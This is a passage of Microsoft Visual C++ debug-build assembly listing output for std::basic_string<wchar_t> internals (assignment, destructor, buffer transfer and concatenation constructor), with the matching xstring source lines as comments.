	00 00		 mov	 rax, QWORD PTR _Right$[rbp]
  00076	48 8b c8	 mov	 rcx, rax
  00079	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
  0007e	48 8b 8d 28 01
	00 00		 mov	 rcx, QWORD PTR _Right$[rbp]
  00085	4c 8b 41 10	 mov	 r8, QWORD PTR [rcx+16]
  00089	48 8b d0	 mov	 rdx, rax
  0008c	48 8b 8d 20 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00093	e8 00 00 00 00	 call	 ?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign

; 3229 :         return *this;

  00098	48 8b 85 20 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
$LN1@operator:

; 3230 :     }

  0009f	48 8d a5 08 01
	00 00		 lea	 rsp, QWORD PTR [rbp+264]
  000a6	5f		 pop	 rdi
  000a7	5d		 pop	 rbp
  000a8	c3		 ret	 0
??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 3176 :     _CONSTEXPR20 ~basic_string() noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 3177 :         _Tidy_deallocate();

  0001f	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_deallocate

; 3178 : #if _ITERATOR_DEBUG_LEVEL != 0
; 3179 :         auto&& _Alproxy          = _GET_PROXY_ALLOCATOR(_Alty, _Getal());
; 3180 :         const auto _To_delete    = _Mypair._Myval2._Myproxy;
; 3181 :         _Mypair._Myval2._Myproxy = nullptr;
; 3182 :         _Delete_plain_internal(_Alproxy, _To_delete);
; 3183 : #endif // _ITERATOR_DEBUG_LEVEL != 0
; 3184 :     }

  0002b	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00032	48 8b c8	 mov	 rcx, rax
  00035	e8 00 00 00 00	 call	 ??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ
  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z
_TEXT	SEGMENT
_My_data$ = 8
_Right_data$ = 40
_My_data_mem$1 = 72
_Right_data_mem$2 = 104
$T3 = 324
$T4 = 356
tv148 = 376
this$ = 416
_Right$ = 424
?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Take_contents, COMDAT

; 3052 :     _CONSTEXPR20 void _Take_contents(basic_string& _Right) noexcept {

$LN5:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec a8 01
	00 00		 sub	 rsp, 424		; 000001a8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 3053 :         // assign by stealing _Right's buffer
; 3054 :         // pre: this != &_Right
; 3055 :         // pre: allocator propagation (POCMA) from _Right, if necessary, is complete
; 3056 :         // pre: *this owns no memory, iterators orphaned
; 3057 :         // (note: _Buf/_Ptr/_Mysize/_Myres may be garbage init)
; 3058 :         auto& _My_data    = _Mypair._Myval2;

  00024	48 8b 85 a0 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	48 89 45 08	 mov	 QWORD PTR _My_data$[rbp], rax

; 3059 :         auto& _Right_data = _Right._Mypair._Myval2;

  0002f	48 8b 85 a8 01
	00 00		 mov	 rax, QWORD PTR _Right$[rbp]
  00036	48 89 45 28	 mov	 QWORD PTR _Right_data$[rbp], rax

; 3060 : 
; 3061 : #if !defined(_INSERT_STRING_ANNOTATION)
; 3062 :         if constexpr (_Can_memcpy_val) {
; 3063 : #if _HAS_CXX20
; 3064 :             if (!_STD is_constant_evaluated())
; 3065 : #endif // _HAS_CXX20
; 3066 :             {
; 3067 : #if _ITERATOR_DEBUG_LEVEL != 0
; 3068 :                 if (_Right_data._Large_mode_engaged()) {
; 3069 :                     // take ownership of _Right's iterators along with its buffer
; 3070 :                     _Swap_proxy_and_iterators(_Right);
; 3071 :                 } else {
; 3072 :                     _Right_data._Orphan_all();
; 3073 :                 }
; 3074 : #endif // _ITERATOR_DEBUG_LEVEL != 0
; 3075 : 
; 3076 :                 const auto _My_data_mem =

  0003a	48 8b 85 a0 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00041	48 8b c8	 mov	 rcx, rax
  00044	e8 00 00 00 00	 call	 ??$addressof@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEAV?$_String_val@U?$_Simple_types@_W@std@@@0@AEAV10@@Z ; std::addressof<std::_String_val<std::_Simple_types<wchar_t> > >
  00049	48 89 45 48	 mov	 QWORD PTR _My_data_mem$1[rbp], rax

; 3077 :                     reinterpret_cast<unsigned char*>(_STD addressof(_Mypair._Myval2)) + _Memcpy_val_offset;
; 3078 :                 const auto _Right_data_mem =

  0004d	48 8b 85 a8 01
	00 00		 mov	 rax, QWORD PTR _Right$[rbp]
  00054	48 8b c8	 mov	 rcx, rax
  00057	e8 00 00 00 00	 call	 ??$addressof@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEAV?$_String_val@U?$_Simple_types@_W@std@@@0@AEAV10@@Z ; std::addressof<std::_String_val<std::_Simple_types<wchar_t> > >
  0005c	48 89 45 68	 mov	 QWORD PTR _Right_data_mem$2[rbp], rax

; 3079 :                     reinterpret_cast<const unsigned char*>(_STD addressof(_Right._Mypair._Myval2)) + _Memcpy_val_offset;
; 3080 :                 _CSTD memcpy(_My_data_mem, _Right_data_mem, _Memcpy_val_size);

  00060	41 b8 20 00 00
	00		 mov	 r8d, 32			; 00000020H
  00066	48 8b 55 68	 mov	 rdx, QWORD PTR _Right_data_mem$2[rbp]
  0006a	48 8b 4d 48	 mov	 rcx, QWORD PTR _My_data_mem$1[rbp]
  0006e	e8 00 00 00 00	 call	 memcpy

; 3081 : 
; 3082 :                 _Right_data._Mysize = 0;

  00073	48 8b 45 28	 mov	 rax, QWORD PTR _Right_data$[rbp]
  00077	48 c7 40 10 00
	00 00 00	 mov	 QWORD PTR [rax+16], 0

; 3083 :                 _Right_data._Myres  = _Small_string_capacity;

  0007f	48 8b 45 28	 mov	 rax, QWORD PTR _Right_data$[rbp]
  00083	48 c7 40 18 07
	00 00 00	 mov	 QWORD PTR [rax+24], 7

; 3084 :                 _Right_data._Activate_SSO_buffer();

  0008b	48 8b 4d 28	 mov	 rcx, QWORD PTR _Right_data$[rbp]
  0008f	e8 00 00 00 00	 call	 ?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer

; 3085 :                 _Traits::assign(_Right_data._Bx._Buf[0], _Elem());

  00094	33 c0		 xor	 eax, eax
  00096	66 89 85 44 01
	00 00		 mov	 WORD PTR $T3[rbp], ax
  0009d	b8 02 00 00 00	 mov	 eax, 2
  000a2	48 6b c0 00	 imul	 rax, rax, 0
  000a6	48 8b 4d 28	 mov	 rcx, QWORD PTR _Right_data$[rbp]
  000aa	48 03 c8	 add	 rcx, rax
  000ad	48 8b c1	 mov	 rax, rcx
  000b0	48 8d 95 44 01
	00 00		 lea	 rdx, QWORD PTR $T3[rbp]
  000b7	48 8b c8	 mov	 rcx, rax
  000ba	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign

; 3086 :                 return;

  000bf	e9 e5 00 00 00	 jmp	 $LN1@Take_conte

; 3087 :             }
; 3088 :         }
; 3089 : #endif // !defined(_INSERT_STRING_ANNOTATION)
; 3090 : 
; 3091 :         if (_Right_data._Large_mode_engaged()) { // steal buffer

  000c4	48 8b 4d 28	 mov	 rcx, QWORD PTR _Right_data$[rbp]
  000c8	e8 00 00 00 00	 call	 ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
  000cd	0f b6 c0	 movzx	 eax, al
  000d0	85 c0		 test	 eax, eax
  000d2	74 31		 je	 SHORT $LN2@Take_conte

; 3092 :             _Swap_proxy_and_iterators(_Right);

  000d4	48 8b 95 a8 01
	00 00		 mov	 rdx, QWORD PTR _Right$[rbp]
  000db	48 8b 8d a0 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000e2	e8 00 00 00 00	 call	 ?_Swap_proxy_and_iterators@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Swap_proxy_and_iterators

; 3093 : 
; 3094 :             _Construct_in_place(_My_data._Bx._Ptr, _Right_data._Bx._Ptr);

  000e7	48 8b 45 28	 mov	 rax, QWORD PTR _Right_data$[rbp]
  000eb	48 8b 4d 08	 mov	 rcx, QWORD PTR _My_data$[rbp]
  000ef	48 8b d0	 mov	 rdx, rax
  000f2	e8 00 00 00 00	 call	 ??$_Construct_in_place@PEA_WAEAPEA_W@std@@YAXAEAPEA_W0@Z ; std::_Construct_in_place<wchar_t *,wchar_t * &>

; 3095 :             _Right_data._Bx._Switch_to_buf();

  000f7	48 8b 45 28	 mov	 rax, QWORD PTR _Right_data$[rbp]
  000fb	48 8b c8	 mov	 rcx, rax
  000fe	e8 00 00 00 00	 call	 ?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Switch_to_buf

; 3096 :         } else { // copy small string buffer

  00103	eb 41		 jmp	 SHORT $LN3@Take_conte
$LN2@Take_conte:

; 3097 :             _Right_data._Orphan_all();

  00105	48 8b 4d 28	 mov	 rcx, QWORD PTR _Right_data$[rbp]
  00109	e8 00 00 00 00	 call	 ?_Orphan_all@_Container_base0@std@@QEAAXXZ ; std::_Container_base0::_Orphan_all

; 3098 : 
; 3099 :             _My_data._Activate_SSO_buffer();

  0010e	48 8b 4d 08	 mov	 rcx, QWORD PTR _My_data$[rbp]
  00112	e8 00 00 00 00	 call	 ?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer

; 3100 :             _Traits::copy(_My_data._Bx._Buf, _Right_data._Bx._Buf, _Right_data._Mysize + 1);

  00117	48 8b 45 28	 mov	 rax, QWORD PTR _Right_data$[rbp]
  0011b	48 8b 40 10	 mov	 rax, QWORD PTR [rax+16]
  0011f	48 ff c0	 inc	 rax
  00122	48 8b 4d 28	 mov	 rcx, QWORD PTR _Right_data$[rbp]
  00126	48 8b 55 08	 mov	 rdx, QWORD PTR _My_data$[rbp]
  0012a	48 89 95 78 01
	00 00		 mov	 QWORD PTR tv148[rbp], rdx
  00131	4c 8b c0	 mov	 r8, rax
  00134	48 8b d1	 mov	 rdx, rcx
  00137	48 8b 85 78 01
	00 00		 mov	 rax, QWORD PTR tv148[rbp]
  0013e	48 8b c8	 mov	 rcx, rax
  00141	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy
$LN3@Take_conte:

; 3101 :         }
; 3102 : 
; 3103 :         _My_data._Myres  = _Right_data._Myres;

  00146	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  0014a	48 8b 4d 28	 mov	 rcx, QWORD PTR _Right_data$[rbp]
  0014e	48 8b 49 18	 mov	 rcx, QWORD PTR [rcx+24]
  00152	48 89 48 18	 mov	 QWORD PTR [rax+24], rcx

; 3104 :         _My_data._Mysize = _Right_data._Mysize;

  00156	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  0015a	48 8b 4d 28	 mov	 rcx, QWORD PTR _Right_data$[rbp]
  0015e	48 8b 49 10	 mov	 rcx, QWORD PTR [rcx+16]
  00162	48 89 48 10	 mov	 QWORD PTR [rax+16], rcx

; 3105 : 
; 3106 :         _Right_data._Mysize = 0;

  00166	48 8b 45 28	 mov	 rax, QWORD PTR _Right_data$[rbp]
  0016a	48 c7 40 10 00
	00 00 00	 mov	 QWORD PTR [rax+16], 0

; 3107 :         _Right_data._Myres  = _Small_string_capacity;

  00172	48 8b 45 28	 mov	 rax, QWORD PTR _Right_data$[rbp]
  00176	48 c7 40 18 07
	00 00 00	 mov	 QWORD PTR [rax+24], 7

; 3108 :         _Traits::assign(_Right_data._Bx._Buf[0], _Elem());

  0017e	33 c0		 xor	 eax, eax
  00180	66 89 85 64 01
	00 00		 mov	 WORD PTR $T4[rbp], ax
  00187	b8 02 00 00 00	 mov	 eax, 2
  0018c	48 6b c0 00	 imul	 rax, rax, 0
  00190	48 8b 4d 28	 mov	 rcx, QWORD PTR _Right_data$[rbp]
  00194	48 03 c8	 add	 rcx, rax
  00197	48 8b c1	 mov	 rax, rcx
  0019a	48 8d 95 64 01
	00 00		 lea	 rdx, QWORD PTR $T4[rbp]
  001a1	48 8b c8	 mov	 rcx, rax
  001a4	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign
$LN1@Take_conte:

; 3109 :     }

  001a9	48 8d a5 88 01
	00 00		 lea	 rsp, QWORD PTR [rbp+392]
  001b0	5f		 pop	 rdi
  001b1	5d		 pop	 rbp
  001b2	c3		 ret	 0
?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Take_contents
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z
_TEXT	SEGMENT
_New_size$ = 8
_New_capacity$ = 40
_My_data$ = 72
_Ptr$ = 104
_Alproxy$ = 136
_Proxy$ = 164
_Fancyptr$6 = 200
$T7 = 420
$T8 = 452
$T9 = 484
__$ArrayPad$ = 504
this$ = 544
__formal$ = 552
_Source_of_al$ = 560
_Left_ptr$ = 568
_Left_size$ = 576
_Right_ptr$ = 584
_Right_size$ = 592
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 2840 :             _One_then_variadic_args_t{}, _Alty_traits::select_on_container_copy_construction(_Source_of_al._Getal())) {

$LN4:
  00000	4c 89 4c 24 20	 mov	 QWORD PTR [rsp+32], r9
  00005	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  0000a	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  0000e	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00013	55		 push	 rbp
  00014	57		 push	 rdi
  00015	48 81 ec 28 02
	00 00		 sub	 rsp, 552		; 00000228H
  0001c	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00021	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00026	b9 52 00 00 00	 mov	 ecx, 82			; 00000052H
  0002b	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  00030	f3 ab		 rep stosd
  00032	48 8b 8c 24 48
	02 00 00	 mov	 rcx, QWORD PTR [rsp+584]
  0003a	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00041	48 33 c5	 xor	 rax, rbp
  00044	48 89 85 f8 01
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  0004b	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00052	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2839 :         : _Mypair(

  00057	48 8b 8d 30 02
	00 00		 mov	 rcx, QWORD PTR _Source_of_al$[rbp]
  0005e	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  00063	48 8b d0	 mov	 rdx, rax
  00066	48 8d 8d a4 01
	00 00		 lea	 rcx, QWORD PTR $T7[rbp]
  0006d	e8 00 00 00 00	 call	 ?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::select_on_container_copy_construction
  00072	48 8b 8d 20 02
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00079	4c 8b c0	 mov	 r8, rax
  0007c	0f b6 95 c4 01
	00 00		 movzx	 edx, BYTE PTR $T8[rbp]
  00083	e8 00 00 00 00	 call	 ??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> >

; 2841 :         _STL_INTERNAL_CHECK(_Left_size <= max_size());
; 2842 :         _STL_INTERNAL_CHECK(_Right_size <= max_size());
; 2843 :         _STL_INTERNAL_CHECK(_Right_size <= max_size() - _Left_size);
; 2844 :         const auto _New_size    = static_cast<size_type>(_Left_size + _Right_size);

  00088	48 8b 85 50 02
	00 00		 mov	 rax, QWORD PTR _Right_size$[rbp]
  0008f	48 8b 8d 40 02
	00 00		 mov	 rcx, QWORD PTR _Left_size$[rbp]
  00096	48 03 c8	 add	 rcx, rax
  00099	48 8b c1	 mov	 rax, rcx
  0009c	48 89 45 08	 mov	 QWORD PTR _New_size$[rbp], rax

; 2845 :         size_type _New_capacity = _Small_string_capacity;

  000a0	48 c7 45 28 07
	00 00 00	 mov	 QWORD PTR _New_capacity$[rbp], 7

; 2846 :         auto& _My_data          = _Mypair._Myval2;

  000a8	48 8b 85 20 02
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  000af	48 89 45 48	 mov	 QWORD PTR _My_data$[rbp], rax

; 2847 :         _Elem* _Ptr             = _My_data._Bx._Buf;

  000b3	48 8b 45 48	 mov	 rax, QWORD PTR _My_data$[rbp]
  000b7	48 89 45 68	 mov	 QWORD PTR _Ptr$[rbp], rax

; 2848 :         auto&& _Alproxy         = _GET_PROXY_ALLOCATOR(_Alty, _Getal());

  000bb	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:?_Fake_alloc@std@@3U_Fake_allocator@1@B
  000c2	48 89 85 88 00
	00 00		 mov	 QWORD PTR _Alproxy$[rbp], rax

; 2849 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data); // throws

  000c9	4c 8b 45 48	 mov	 r8, QWORD PTR _My_data$[rbp]
  000cd	48 8b 95 88 00
	00 00		 mov	 rdx, QWORD PTR _Alproxy$[rbp]
  000d4	48 8d 8d a4 00
	00 00		 lea	 rcx, QWORD PTR _Proxy$[rbp]
  000db	e8 00 00 00 00	 call	 ??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl

; 2850 : 
; 2851 :         if (_New_capacity < _New_size) {

  000e0	48 8b 45 08	 mov	 rax, QWORD PTR _New_size$[rbp]
  000e4	48 39 45 28	 cmp	 QWORD PTR _New_capacity$[rbp], rax
  000e8	73 63		 jae	 SHORT $LN2@basic_stri

; 2852 :             _New_capacity           = _Calculate_growth(_New_size, _Small_string_capacity, max_size());

  000ea	48 8b 8d 20 02
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  000f6	4c 8b c0	 mov	 r8, rax
  000f9	ba 07 00 00 00	 mov	 edx, 7
  000fe	48 8b 4d 08	 mov	 rcx, QWORD PTR _New_size$[rbp]
  00102	e8 00 00 00 00	 call	 ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
  00107	48 89 45 28	 mov	 QWORD PTR _New_capacity$[rbp], rax

; 2853 :             const pointer _Fancyptr = _Allocate_for_capacity(_Getal(), _New_capacity); // throws

  0010b	48 8b 8d 20 02
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00112	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  00117	48 8d 55 28	 lea	 rdx, QWORD PTR _New_capacity$[rbp]
  0011b	48 8b c8	 mov	 rcx, rax
  0011e	e8 00 00 00 00	 call	 ??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
  00123	48 89 85 c8 00
	00 00		 mov	 QWORD PTR _Fancyptr$6[rbp], rax

; 2854 :             _Ptr                    = _Unfancy(_Fancyptr);

  0012a	48 8b 8d c8 00
	00 00		 mov	 rcx, QWORD PTR _Fancyptr$6[rbp]
  00131	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ; std::_Unfancy<wchar_t>
  00136	48 89 45 68	 mov	 QWORD PTR _Ptr$[rbp], rax

; 2855 :             _Construct_in_place(_My_data._Bx._Ptr, _Fancyptr);

  0013a	48 8b 45 48	 mov	 rax, QWORD PTR _My_data$[rbp]
  0013e	48 8d 95 c8 00
	00 00		 lea	 rdx, QWORD PTR _Fancyptr$6[rbp]
  00145	48 8b c8	 mov	 rcx, rax
  00148	e8 00 00 00 00	 call	 ??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
$LN2@basic_stri:

; 2856 :         }
; 2857 : 
; 2858 :         _My_data._Mysize = _New_size;

  0014d	48 8b 45 48	 mov	 rax, QWORD PTR _My_data$[rbp]
  00151	48 8b 4d 08	 mov	 rcx, QWORD PTR _New_size$[rbp]
  00155	48 89 48 10	 mov	 QWORD PTR [rax+16], rcx

; 2859 :         _My_data._Myres  = _New_capacity;

  00159	48 8b 45 48	 mov	 rax, QWORD PTR _My_data$[rbp]
  0015d	48 8b 4d 28	 mov	 rcx, QWORD PTR _New_capacity$[rbp]
  00161	48 89 48 18	 mov	 QWORD PTR [rax+24], rcx

; 2860 :         _Traits::copy(_Ptr, _Left_ptr, _Left_size);

  00165	4c 8b 85 40 02
	00 00		 mov	 r8, QWORD PTR _Left_size$[rbp]
  0016c	48 8b 95 38 02
	00 00		 mov	 rdx, QWORD PTR _Left_ptr$[rbp]
  00173	48 8b 4d 68	 mov	 rcx, QWORD PTR _Ptr$[rbp]
  00177	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy

; 2861 :         _Traits::copy(_Ptr + static_cast<ptrdiff_t>(_Left_size), _Right_ptr, _Right_size);

  0017c	48 8b 45 68	 mov	 rax, QWORD PTR _Ptr$[rbp]
  00180	48 8b 8d 40 02
	00 00		 mov	 rcx, QWORD PTR _Left_size$[rbp]
  00187	48 8d 04 48	 lea	 rax, QWORD PTR [rax+rcx*2]
  0018b	4c 8b 85 50 02
	00 00		 mov	 r8, QWORD PTR _Right_size$[rbp]
  00192	48 8b 95 48 02
	00 00		 mov	 rdx, QWORD PTR _Right_ptr$[rbp]
  00199	48 8b c8	 mov	 rcx, rax
  0019c	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy

; 2862 :         _Traits::assign(_Ptr[_New_size], _Elem());

  001a1	33 c0		 xor	 eax, eax
  001a3	66 89 85 e4 01
	00 00		 mov	 WORD PTR $T9[rbp], ax
  001aa	48 8b 45 68	 mov	 rax, QWORD PTR _Ptr$[rbp]
  001ae	48 8b 4d 08	 mov	 rcx, QWORD PTR _New_size$[rbp]
  001b2	48 8d 04 48	 lea	 rax, QWORD PTR [rax+rcx*2]
  001b6	48 8d 95 e4 01
	00 00		 lea	 rdx, QWORD PTR $T9[rbp]
  001bd	48 8b c8	 mov	 rcx, rax
  001c0	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign

; 2863 :         _ASAN_STRING_CREATE(*this);
; 2864 :         _Proxy._Release();

  001c5	48 8d 8d a4 00
	00 00		 lea	 rcx, QWORD PTR _Proxy$[rbp]
  001cc	e8 00 00 00 00	 call	 ?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ ; std::_Fake_proxy_ptr_impl::_Release

; 2865 :     }

  001d1	48 8b 85 20 02
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  001d8	48 8b f8	 mov	 rdi, rax
  001db	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  001df	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z$rtcFrameData
  001e6	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  001eb	48 8b c7	 mov	 rax, rdi
  001ee	48 8b 8d f8 01
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  001f5	48 33 cd	 xor	 rcx, rbp
  001f8	e8 00 00 00 00	 call	 __security_check_cookie
  001fd	48 8d a5 08 02
	00 00		 lea	 rsp, QWORD PTR [rbp+520]
  00204	5f		 pop	 rdi
